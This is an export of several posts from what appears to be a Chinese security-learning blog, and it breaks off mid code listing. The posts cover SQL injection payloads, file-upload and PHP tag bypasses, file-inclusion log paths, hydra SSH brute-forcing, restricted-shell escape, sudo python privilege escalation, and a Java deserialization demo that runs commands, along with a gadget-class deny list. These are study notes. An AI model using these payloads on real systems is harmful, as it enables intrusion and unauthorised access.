[{"content":"","date":"2024-03-06T13:57:00+08:00","permalink":"https://d4n-sec.github.io/p/test/","title":"Test"},{"content":"一些详细知识点的备忘\nSQL注入 1.floor类型报错注入，原理是 group by 和 random()相遇时，group by的运行方式发生变化，会两次查询，第一次查询做比较，如果不存在则尝试插入，将第二次查询结果尝试插入，因为random的随机性，第二次插入时的值较第一次发生变化，导致第二次的插入的值其实已经存在，所以报错主键已存在\n还可以进行的思考：\ngroup by 为什么要做这样的变化，根据什么判断然后造成的变化，哪些可以造成 group by 运行机制变化\n联合查询payload\n1 2 3 4 5 6 7 8 9 10 11 1\u0026#39; order by 4 #\t#列数为4 -1\u0026#39; union select 1,2,3,4 #\t#查看回显位 -1\u0026#39; union select 1,database(),3,4 #\t#查看数据库 -1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4 #\t#查看当前数据库表名 -1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;flag\u0026#39;),3,4 # #查看flag表的列名 -1\u0026#39; union select 1,(select flag from flag),3,4 # #带入表名，列名直接查询 空格绕过\n注释代替空格\n/**/ -\u0026gt; 读文件和写文件函数\n注意有个配置需要打开 secure_file_priv=''\n读文件 load_file() 需要知道绝对路径\n写文件 select 1,\u0026lt;?phpinfo();?\u0026gt; into outfile \u0026quot;C:\\\\1.txt\u0026quot;\n文件上传 绕过类型分白名单和黑名单绕过，尝试大小写，双写？%00截断 .htaccess .user.ini 图片马，content-type判断修改\nwindows特性：大小写不敏感，末尾+空格，特殊字符自动去掉\n末尾带.：畸形解析？\n::$DATA ：保存文件时将后面的数据当做文件流处理\n.user.ini\n.user.ini 的作用范围是本目录，子目录无效（测试php版本 5.3.29nts）且.user.ini 就是php.ini的当前目录下的临时配置（写法规则一样），所以优先级比php.ini高\nCGI程序就是配置了相关路径信息，访问特定URL目录和指定文件后，根据 Shebang 行找到解释器调用解析处理，标准输出接入到socket\nApache 中的 ScriptAlias /cgi-b/ \u0026ldquo;${SRVROOT}/cgi-bin/\u0026rdquo; 指定了访问URL上的/cgi-b/目录时，会在本地${SRVROOT}/cgi-bin/下查找相应脚本（脚本后缀需要在httpd.conf注册，需要配置 Shebang 行）\nFastCGI模式（猜测 会预先处理好脚本），运行脚本后不结束运行（CGI每次访问都会fork一次进程）\n还有其他CGI模式\n7.3.4nts 需要重启 才能生效\n.htaccess\n利用有条件\n1.mod_rewrite模块开启。\n2.AllowOverride All\n构造图片马命令\ncopy 1.jpg/a+2.php/b 3.jpg\n条件竞争\n先上传再删除（移动，重命名？）\nbp就可以一直上传，然后手动刷新页面访问即可\n二次渲染\n上传后的文件重新根据文件大小？图片规则？重新生成图片\n漏洞在于重新生成的部分还是有保留部分源文件，把木马放到没被改变的地方就OK\n文件包含 日志路径：\n1 2 3 /var/log/apache2/access.log (access_log) error.log error_log /var/log/httpd/access.log /var/log/nginx/error.log 伪协议：\nphp://filter/convert.base64-encode/resource=../file.php\nphp://filter/read=convert.base64-encode/resource=../file.php\nPython临时http服务\n1 2 python2 -m SimpleHTTPServer 8000 python3 -m http.server 9000 可以访问被包含的文件，获得更多信息\nBP爆破模式 sniper:按照字典顺序一个一个参数依次遍历，一个参数遍历完,再遍历下一个参数 battering ram:每个参数同时遍历同一个字典 pitchfork:多个参数同时进行遍历,只是一个选择字典1，一个选择字典2 Clusterbomb:有点像两个嵌套的for循环，参数i和参数j，i=0，然后j要从0-10全部跑完，然后i=1，然后j再从0-10跑完，一对多，多次遍历\nPHP标签绕过 1 2 3 4 5 \u0026lt;? echo \u0026#39;123\u0026#39;;?\u0026gt; #前提是开启配置参数short_open_tags=on \u0026lt;?=(表达式)?\u0026gt; 等价于 \u0026lt;?php echo (表达式)?\u0026gt; #不需要开启参数设置 \u0026lt;% echo \u0026#39;123\u0026#39;;%\u0026gt; #开启配置参数asp_tags=on，并且只能在7.0以下版本使用 \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;echo \u0026#39;123\u0026#39;; \u0026lt;/script\u0026gt; #不需要修改参数开关，但是只能在7.0以下可用。 \u0026lt;?PHP ?\u0026gt; #大写也是可以的，EVAL函数也可以大写 XSS \u0026lt;script\u0026gt;标签可以部分大小写，所以可以进行绕过\n","date":"2023-09-07T00:00:00Z","permalink":"https://d4n-sec.github.io/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/","title":"PTE知识记录"},{"content":"摘要\n渗透测试个人经验 ssh ssh爆破 ssh爆破使用工具 hydra ，主要因为快速，其他工具速度过慢\n使用hydra爆破：\n1 hydra -l ezpd -P 1.txt 192.168.229.129 ssh -v 1 2 3 4 5 -l 指定用户名 -L 指定用户名字典文件 -p 指定密码 -P 指定密码字典文件 -v 显示详细的执行过程 ssh密码生成 ssh密码生成工具 crunch\ncat /usr/share/crunch/charset.lst 选择要使用的crunch字典字符集范围\n找到合适的字符集，然后使用\n1 crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ \u0026gt; pass.dic 关于上面命令的疑问 @替代未知字符未知？\nLinux常用命令 遇到一个被限制的shell，想要整理一个命令清单，后期想办法爆破一下有哪些命令可以使用\n主要参考\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 ls #\t列出目录的内容 alias #\t定义或显示别名 unalias #\t删除别名定义 pwd #\t打印工作目录 cd #\t更改目录 cat #\t读取文件 more #\t查看一个长文件的内容 less #\t查看一个长文件的内容 但是它允许在文件中和正向操作一样的反向操作 head #\thead -2 file1 查看一个文件的前两行 tail #\ttail -2 file1 查看一个文件的最后两行 tac #\t从最后一行开始反向查看一个文件的内容 cp #\t复制文件和目录 rm #\t删除文件和目录 mv #\t移动（重命名）文件和目录 mkdir #\t创建目录 man #\t显示其他命令的手册页面 touch #\t创建空文件 groupadd #\t创建一个新用户组 groupdel #\t删除一个用户组 groupmod #\t重命名一个用户组 useradd #\t创建用户 userdel #\t删除用户 usermod #\t修改用户属性 chage #\t（-E 2005-12-31 user1 设置用户口令的失效期限 ） pwck #\t检查 \u0026#39;/etc/passwd\u0026#39; 的文件格式和语法修正以及存在的用户 grpck #\t检查 \u0026#39;/etc/passwd\u0026#39; 的文件格式和语法修正以及存在的群组 newgrp #\t(newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 ) chmod #\t更改文件权限 chown #\t更改文件拥有者 chattr #\t文件的特殊属性 lsattr #\t显示文件的特殊属性 sudo #\t以超级用户身份执行命令 su #\t切换用户 htop #\t显示进程和资源信息 unzip #\t解压zip文件 echo #\t显示文本行 cat #\t打印文件内容 ps #\t报告shell进程状态 kill #\t终止程序 ping #\t测试网络连接 history #\t显示以前的命令列表 passwd #\t更改用户密码 which #\t返回程序的完整二进制路径 shred #\t覆盖文件以隐藏其内容 grep #\t打印与给定条件匹配行 sort #\t排序文件的内容 comm #\t对比两个文件内容 ifconfig #\t显示网络配置 netstat #\t端口查看？ nslookup #\t查看DNS解析 whoami #\t输出用户名 whatis #\t显示单行说明 wc #\t字数文件 paste #\tpaste file1 file2 合并两个文件或两栏的内容 bunzip2 #\t解压软件 bzip3 #\t同上 bzip2 #\t同上 gzip #\t同上 lunzip #\t同上 unzip #\t同上 eb-utils #\t同上 rzip #\t同上 gunzip #\t同上 rar #\t同上 unrar #\t同上 zip #\t同上 unzip #\t同上 uname #\t显示操作系统信息 neofetch #\t显示操作系统和硬件信息 find #\t搜索遵循模式的文件 sed #\t每次仅读取一行内容（读取文件） ssh #\tssh远程登录 ftp #\t访问ftp服务器 wget #\t从互联网检索文件 file #\t查看文件类型 export #\t环境变量相关 apt #\t包管理器（下载安装工具） yum #\t同上 rpm #\t同上 pacman #\t同上 dpkg #\t好像也是同上 arch #\t显示机器的处理器架构 dmidecode #\t推荐参数（-q） 显示硬件系统部件 - (SMBIOS / DMI) hdparm #\t（-i） /dev/hda 罗列一个磁盘的架构特性（-tT /dev/sda） 在磁盘上执行测试性读取操作 lspci #\t（-tv）罗列 PCI 设备 （-tv）显示 USB 设备 date #\t显示系统日期 cal #\t（cal 2007） 显示2007年的日历表 clock #\t（-w）将时间修改保存到 BIOS tree #\t显示文件和目录由根目录开始的树形结构 ostree #\t操作系统树 pstree #\t进程树 iconv #\t列出已知的编码 locate #\t文件搜索 whereis #\t文件搜索（显示一个二进制文件、源码或man的位置 ） which #\t文件搜索（显示一个二进制文件或可执行文件的完整路径 ） mount #\t挂载一个文件系统 umount #\t卸载一个文件系统 fuser #\t当设备繁忙时强制卸载 df #\t（-h 显示已经挂载的分区列表 ） du #\t（-sh dir1 估算目录 \u0026#39;dir1\u0026#39; 已经使用的磁盘空间\u0026#39; ） ln #\t创建一个指向文件或目录的软链接 1 2 vim #\t高效文本编辑 vi #\t同上 下面是不要轻易尝试的\n1 2 3 4 5 shutdown #\t关闭您的机器 reboot #\t重启 logout #\t注销 telinit #\t关机相关命令 exit #\t退出当前shell会话 OK，发现盲点：本次靶机ssh登录后，无输入直接两次tab键即可查看可用命令\n受限shell逃逸 参考文章\n顾名思义：受限制的shell，有以下功能受限（可以设置某些选项不受限）\nWikiPedia上有提到受限shell的弱点\nA user can break out of the restricted environment by running a program that features a shell function 用户可以通过运行具有shell功能的程序来打破限制环境\nLinux 自带程序里vi/vim有类似功能，当然如果能够再开一个shell也能达到相同目的\n实战靶机里逃逸所用语句：\n找不到执行的命令 尝试完整路径执行命令如/bin/whoami\n最好还是设置一下环境变量\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nsudoers权限查看 命令的话直接sudo -l查看就OK了\n权限管理文件是/etc/sudoers\nsudoers文件编辑结构\nu002 代表对 u002 用户的权限编辑\n第一个 ALL 代表网络中的主机（具体的权限控制，根据初步阅读可以设置为机器组。这些可能包括主机名(可选择使用通配符)、IP地址、网络号码或网络组。）\nGroups of machines. These may include host names (optionally with wildcards) IP addresses, network numbers or netgroups.\n第二个 ALL 规定可以使用谁的身份去执行命令 （目前发现 如果是root的话就可以使用root权限执行命令 ）\n如果设置了 NOPASSWD 可以免密执行\n第三个 ALL 规定可以使用（指定身份）执行的命令\n如果是如下权限设置的话，就可以使用 python 一句话提权\nsudo python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\n其他配置后可以使用root权限的方式\n","date":"2023-06-25T00:00:00Z","permalink":"https://d4n-sec.github.io/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AA%E4%BA%BA%E7%BB%8F%E9%AA%8C/","title":"渗透测试个人经验"},{"content":"本章是 D4n的Java安全入门 第一篇，望大佬指正，小白避坑\n测试用Java版本（17.0.6）\nJava反序列化 什么是反序列化 ​\t借用一下大佬的描述：\nJava描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。 但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。\n序列化与反序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。\n​\t用自己的话说就是，如果需要传输一个对象（或是一段数据）给目标（途径可以是网络，进程间等任何可以传输数据的地方，目标可以是客户端，子进程，线程等）需要将对象的一些或者所有信息以一种格式传输给目标，比如常见的JSON、XML、YAML格式，就是将一些数据格式化为相应标准格式的例子\n​\t这种将数据格式标准化的过程就可以称之为序列化，而对应的，目标接收到这种格式化数据之后，将对象或者数据还原成原本或者需要的样子就称为反序列化。\n​\t在Java中想要序列化一个对象，需要同时满足两个条件：\n该类必须实现 java.io.Serializable 接口。 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 ​\t只有实现了Serializable或Externalizable接口的类的对象才能被序列化，否则抛出异常。 ​\t注：Externalizable 是继承了Serializable的抽象类\n​\t所以你想知道一个Java标准类是否是可序列化的，可以查看他的类描述，看是否实现了java.io.Serializable接口\n为什么要序列化 对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时候就需要序列化技术。\nJava的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。\n反序列化漏洞来源 开发失误\n开发人员并没有重写ObjectInputStream类的resolveClass方法，或者重写过但是过滤不严格就会导致反序列化漏洞 使用了不安全的基础库\n​\t很大比例的反序列化漏洞是因使用了不安全的基础库而产生的，一般优秀的Java开发人员会按照安全编程规范进行编程，并且一些成熟的Java框架 Spring MVC、Struts2等会有相应的防范机制，如果只是开发失误的话，能造成的反序列化漏洞很少 ​\t但使用不安全的基础库则不一样 ​ 2015年由黑客Gabriel Lawrence和Chris Frohoff发现的Apache Commons Collections类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。 存在危险的基础库：\n1 2 3 4 5 6 7 8 9 10 11 12 commons-fileupload 1.3.1 commons-io 2.4 commons-collections 3.1 commons-logging 1.2 commons-beanutils 1.9.2 org.slf4j:slf4j-api 1.7.21 com.mchange:mchange-commons-java 0.2.11 org.apache.commons:commons-collections 4.0 com.mchange:c3p0 0.9.5.2 org.beanshell:bsh 2.0b5 org.codehaus.groovy:groovy 2.3.9 org.springframework:spring-aop 4.1.4.RELEASE 某反序列化防护软件便是通过禁用以下类的反序列化来保护程序：\n1 2 3 4 5 6 7 8 \u0026#39;org.apache.commons.collections.functors.InvokerTransformer\u0026#39;, \u0026#39;org.apache.commons.collections.functors.InstantiateTransformer\u0026#39;, \u0026#39;org.apache.commons.collections4.functors.InvokerTransformer\u0026#39;, \u0026#39;org.apache.commons.collections4.functors.InstantiateTransformer\u0026#39;, \u0026#39;org.codehaus.groovy.runtime.ConvertedClosure\u0026#39;, \u0026#39;org.codehaus.groovy.runtime.MethodClosure\u0026#39;, \u0026#39;org.springframework.beans.factory.ObjectFactory\u0026#39;, \u0026#39;xalan.internal.xsltc.trax.TemplatesImpl\u0026#39; ​\t基础库中的调用流程一般都比较复杂，不会如同接下来给出的测试用例一般简单，涉及到POP链，反射，泛型等知识\n如何序列化与反序列化 JDK类库提供的序列化API java.io.ObjectOutputStream：表示对象输出流 它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 java.io.ObjectInputStream：表示对象输入流 它的readObject()方法从源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回。 Java对象序列化与反序列化的调用流程 方法一：\n若Student类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化。 ObjectOutputStream采用默认的序列化方式，对Student对象的非transient的实例变量进行序列化。 ObjcetInputStream采用默认的反序列化方式，对对Student对象的非transient的实例变量进行反序列化。\n方法二：\n若Student类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)， ObjectOutputStream调用Student对象的writeObject(ObjectOutputStream out)的方法进行序列化。 ObjectInputStream会调用Student对象的readObject(ObjectInputStream in)的方法进行反序列化。\n方法三：\n若Student类实现了Externalnalizable接口，且Student类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化。 ObjectOutputStream调用Student对象的writeExternal(ObjectOutput out))的方法进行序列化。 ObjectInputStream会调用Student对象的readExternal(ObjectInput in)的方法进行反序列化。\n尝试序列化 先写一个待反序列化的类：\n1 2 3 4 5 6 7 8 9 public class Employee implements java.io.Serializable { public String name; public String identify; public void mailCheck() { System.out.println(\u0026#34;This is the \u0026#34;+this.identify+\u0026#34; of our company\u0026#34;); } } 然后再写一个序列化和反序列化测试类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class SerializeDemo { public static void main(String [] args) { Employee e = new Employee(); e.name = \u0026#34;my name\u0026#34;; e.identify = \u0026#34;General staff\u0026#34;; try { // 打开一个文件输入流 FileOutputStream fileOut = new FileOutputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); // 建立对象输入流 ObjectOutputStream out = new ObjectOutputStream(fileOut); //输出反序列化对象 out.writeObject(e); out.close(); fileOut.close(); System.out.printf(\u0026#34;Serialized data is saved in C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); }catch(IOException i) { i.printStackTrace(); } } } 运行后，Employee对象的序列化数据就存储到了Serialize.txt中，我们打开看一下（使用二进制查看器）\n可以依稀看见：类名，属性名称，属性类型，以及属性对应的值 值得注意的是：大部分的反序列化数据均是以AC ED 00 05 开头的\n反序列化操作就是从字节流中提取对象：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; public class SerializeDemo2 { public static void main(String [] args) { Employee e = null; try { // 打开一个文件输入流 FileInputStream fileIn = new FileInputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); // 建立对象输入流 ObjectInputStream in = new ObjectInputStream(fileIn); // 读取对象 e = (Employee) in.readObject(); in.close(); fileIn.close(); }catch(IOException i) { i.printStackTrace(); return; }catch(ClassNotFoundException c) { System.out.println(\u0026#34;Employee class not found\u0026#34;); c.printStackTrace(); return; } System.out.println(\u0026#34;Deserialized Employee...\u0026#34;); System.out.println(\u0026#34;Name: \u0026#34; + e.name); System.out.println(\u0026#34;This is the \u0026#34;+e.identify+\u0026#34; of our company\u0026#34;); } } 运行后可以发现Employee的数据已经获取到了目标程序中对象e里\n上诉就是一个完整的序列化周期，中间使用文件暂时作为了传输介质，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点\n总结序列化具体步骤 从上面的可以看出对象的序列化步骤是：\n创建一个对象输出流，它可以包装一个其它类型的目标输出流，如文件输出流： ObjectOutputStream out = new ObjectOutputStream(new fileOutputStream(“D:\\\\objectfile.obj”));\n通过对象输出流的writeObject()方法写对象：\n1 2 out.writeObject(“Hello”); out.writeObject(new Date()); 对象的反序列化步骤是：\n创建一个对象输入流，它可以包装一个其它类型输入流，如文件输入流： ObjectInputStream in = new ObjectInputStream(new fileInputStream(“D:\\\\objectfile.obj”));\n通过对象输出流的writeObject()方法写对象：\n1 2 String obj1 = (String)in.readObject(); Date obj2 = (Date)in.readObject(); 序列化与反序列化的必要条件 必须是同包，同名。 serialVersionUID必须一致。有时候两个类的属性稍微不一致的时候，可以通过将此属性写死值，实现序列化和反序列化。 序列化中涉及细节 serialVersionUID 版本控制 ​\tJava的序列化机制是通过在运行时判断类的 serialVersionUID 来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体（类）的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常。\n​\t虚拟机是否允许反序列化，不仅取决于类路径和功能代码是否一致，一个非常重要的一点是两个类的序列化 ID 是否一致，代码中设置 serialVersionUID 可以在类中添加 private static final long serialVersionUID = 1L\n​\t当实现java.io.Serializable接口的实体（类）没有显式地定义一个名为serialVersionUID，类型为long的变量时，Java序列化机制会根据编译的class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，只有同一次编译生成的class才会生成相同的serialVersionUID\n​\t如果我们不希望通过编译来强制划分软件版本，即实现序列化接口的实体能够兼容先前版本，未作更改的类，就需要显式地定义一个名为serialVersionUID，类型为long的变量，不修改这个变量值的序列化实体都可以相互进行串行化和反串行化。\n常见场景 问题出现场景：两个客户端 A 和 B 试图通过网络传递对象数据，A 端将对象 C 序列化为二进制数据再传给 B，B 反序列化得到 C。 问题：C 对象的全类路径假设为 com.inout.Test，在 A 和 B 端都有这么一个类文件，功能代码完全一致。也都实现了 Serializable 接口，但是反序列化时总是提示不成功。 解决：统一serialVersionUID的值\n虽然两个类的功能代码完全一致，但是序列化 ID 不同，他们无法相互序列化和反序列化。\nserialVersionUID 使用场景 序列化存储规则 将同一对象序列化并两次写入同一文件时 Java 序列化机制为了节省磁盘空间，具有特定的存储规则，当写入文件的为同一对象时，并不会再将对象的内容进行存储，而只是再次存储一份引用，文件只会增加小小的几个字节，这几个字节的存储空间就是新增引用和一些控制信息的空间。反序列化时，恢复引用关系，使得反序列化的 e1 和 e2 指向唯一的对象，二者相等，为引用关系，该存储规则极大的节省了存储空间。\n将对象序列化后写入文件，修改对象参数值后再次序列化后写入同一文件时 第一次写入对象以后，第二次再试图写的时候，虚拟机根据引用关系知道已经有一个相同对象已经写入文件，因此只保存第二次写的引用，所以读取时，都是第一次保存的对象。读者在使用一个文件多次 writeObject 需要特别注意这个问题。\n更多细节 关于 静态变量序列化 ，父类的序列化与 Transient 关键字，对敏感字段加密，移步链接3\n初识反序列化漏洞 Java反序列化时，会调用readObject方法就行反序列化操作，当readObject方法书写不当时就会引发漏洞\n有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以\n大佬给的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; public class test0{ public static void main(String args[]) throws Exception{ UnsafeClass0 Unsafe = new UnsafeClass0(); Unsafe.name = \u0026#34;hacked by ph0rse\u0026#34;; FileOutputStream fos = new FileOutputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass0 objectFromDisk = (UnsafeClass0)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); } } class UnsafeClass0 implements Serializable{ public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); } } 能够成功执行到Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);\n对反序列化的疑问与分析 关于大佬的代码我有几个疑问：\nRuntime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;); 只能够控制弹出一个计算器，我能不能使用一个字符串变量代替（PHP反序列化的经验告诉我应该是可行的），进而轻松改变将要执行的命令？\nUnsafeClass0 的 readObject 是何时被执行的，是被谁调用的（因为当我查看下图readObject执行时的源码时 跳转的是ObjectInputStream类的readObject 那么是什么时候调用的UnsafeClass0的readObject呢？（强转类型的时候吗？）\n第一个问题 关于第一个问题，只需要将断点打到Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);，然后观察变量就不难看出可以使用this.command打到我想要的效果，所以修改代码为\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import java.io.*; public class test0{ public static void main(String args[]) throws Exception{ ---- Unsafe.name = \u0026#34;hacked by D4n\u0026#34;; Unsafe.command = \u0026#34;notepad\u0026#34;;//增加 ---- } } class UnsafeClass0 implements Serializable{ --- public String command; //增加 //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ --- Runtime.getRuntime().exec(this.command); //修改 } } 此时只需要控制 Unsafe 对象的 command 属性值即可执行不同命令\n但是在分析第一个问题的时候，刚进入 UnsafeClass0的readObject()方法的时候，this还没有被赋值\n再步过in.defaultReadObject();的时候，this 的变量值就被赋值成了我们设置的样子： 所以我想跟进一下，关于this变量是什么时候怎么样被赋值的，所以应该着重分析in.defaultReadObject();干了哪些事，并且在此之前，其他相关反序列化代码做的事只是创建好对象，开辟好空间，没有赋值操作（猜测）\n新问题：关于this变量是什么时候怎么样被赋值的（序列化字符串是怎么一步一步变成对象的）\n让我们进入in.defaultReadObject();看看 没法直接步入，所以要先 ctrl + B 进入源码后再打断点 贴个源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public void defaultReadObject() throws IOException, ClassNotFoundException { SerialCallbackContext ctx = curContext; if (ctx == null) { throw new NotActiveException(\u0026#34;not in call to readObject\u0026#34;); } Object curObj = ctx.getObj(); ObjectStreamClass curDesc = ctx.getDesc(); bin.setBlockDataMode(false); // Read fields of the current descriptor into a new FieldValues FieldValues values = new FieldValues(curDesc, true); if (curObj != null) { values.defaultCheckFieldValues(curObj); values.defaultSetFieldValues(curObj); } bin.setBlockDataMode(true); if (!curDesc.hasWriteObjectData()) { /* * Fix for 4360508: since stream does not contain terminating * TC_ENDBLOCKDATA tag, set flag so that reading code elsewhere * knows to simulate end-of-custom-data behavior. */ defaultDataEnd = true; } ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) { throw ex; } } 其中第一句赋值完成后就可以看到 ctx中已经存放好了 UnsafeClass0 类的未初始化对象（实际从地址来看就是在in.defaultReadObject();调用时的\u0026quot;this变量\u0026quot;，为了方便称呼，我称之为UnsafeClass0--this\nSerialCallbackContext类理解\n之后\nObject curObj = ctx.getObj();将this地址值赋值给 curObj，即 curObj 是UnsafeClass0--this的引用\nObjectStreamClass curDesc = ctx.getDesc();将对象流赋值给 curDesc 查看 curDesc 发现\n猜测这里存放的是对象属性以及对应值，粗略查看没有找到具体数据，过\nbin.setBlockDataMode(false); BlockDataInputStream 这句的粗略理解就是一个流程控制，暂时无关我需要分析的问题，过 问题1-2：关于this变量是什么时候怎么样被赋值的\nFieldValues values = new FieldValues(curDesc, true); 这句执行之后 curObj暂时没有发生变化\n所以先不去查看FieldValues在做什么事情，根据构造的传参猜测大致是对 类描述进行处理\n接下来进入 if判断\n（ curObj 不为空 ）\n执行完values.defaultSetFieldValues(curObj);之后，curObj的值就被设置好了，果然使用到了 FieldValues类的对象values，跟进一下values.defaultSetFieldValues(curObj);\ndefaultSetFieldValues()第一个IF判断false，第二个判断Ture，将要修改的对象Obj 传入desc.setObjFieldValues(obj, objValues);，跟进前看看objValues是个什么东西\n发现值已经被设置好了，那setObjFieldValues()做的可能只是复制objValues里的值给Obj，此时UnsafeClass0--this就已经改变了\n新问题：objValues 是什么时候赋值的呢\n跟进看一下\n这里就是在往objValues里写东西了，看看readObject0如何解析的（f.isUnshared()返回一个布尔值）\n经历一系列类似流程控制的东西，最后来到了这\n先看看 readString 在干嘛：\n先完整执行一遍，发现路过那条switch语句的时候，str就能被赋值为序列化字符串里的关键字\n说明readUTF是在从序列化字符串中提取数据，看看 bin 是个什么东西\nbin里是已经处理好的序列化字符串碎片，那么是哪个函数在处理整个序列化字符串呢？（找到给bin赋值的语句）\n直接看看不出什么端倪，看来只有跟着断点走一次\n走一次，没有找到给bin.cbuf赋值的地方，但是有意外收获：\n这不就是妥妥的咱要找的东西吗，sigs的来源找到了，怎么赋值给bin.cbuf就暂时不深究了（毕竟其实很想看到的就是如何从序列化中提取出之前写入的序列化数据）\n这里的代码是这样的：\n查看一下这个sigs能在哪些地方被赋值\n看来就只有sigs[j++] = f.getName();sigs[j++] = f.getSignature();这两个地方，康康f.getName()和f.getSignature()在干嘛\n，，，，他没干嘛，所以看看 f 怎么来的 （可恶，对 get set 类函数还是不够敏感，但是也算严谨，，，，）\nObjectStreamField f = fields[i];，所以得看看fields是怎么来的 Field类说明\n这里的fields是直接传参进来的，而且这里是FieldReflectorKey类的构造函数，康康谁在new呢？\n这里的fields哪来的？\n这里的fields也是传参，再跟！\n这里发现给fields赋值的地方有些多，重新debug看看\n多次尝试，发现赋值的地方在：\n再路过就已经处理好啦，跟进：\n这步赋值，跟进：\n这步又是已经被处理好了（怎么这么多检测）重新在Field[] clFields = cl.getDeclaredFields();处打个断点，重新看看\n又是被处理好的，重新跟踪rd\n又，调用的时候已经有了，，，经过反复调试，终于找到一个像是最初处理的函数\n但是已经没有办法追踪了，getDeclaredFields0(publicOnly)粗略理解：\n​\tgetDeclaredFields0() 是 Java 中 Class 类的一个本地方法，实际上是使用 C 或 C++ 等本地语言编写的。本地方法是 Java 中与底层操作系统和硬件交互的一种机制，可以让 Java 程序能够调用底层操作系统提供的本地功能和资源。 ​\tJava 语言本身并不支持底层操作系统和硬件的访问，因此需要使用本地方法来扩展 Java 的能力。本地方法通常由本地库（native library）实现，本地库是一个动态链接库（.dll 或 .so 文件），其中包含了本地方法的实现。在 Java 中，可以使用 System.loadLibrary() 或 System.load() 方法来加载本地库，从而使 Java 程序能够调用本地方法。 ​\t在 Class 类中，getDeclaredFields0() 方法是使用本地语言编写的本地方法，它实现了获取一个类中声明的所有成员变量的功能。当 Java 程序调用 getDeclaredFields() 方法时，实际上是调用了 getDeclaredFields0() 方法的 Java 封装，而这个封装方法会通过 JNI（Java Native Interface）机制来调用本地方法的实现。\n但是getDeclaredFields0(publicOnly)只是获得了类里声明的成员变量，并没有给其赋值，具体的值是什么时候抽取出来的？\n重新调整思路，一路debug寻找，找到了readUTFBody：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 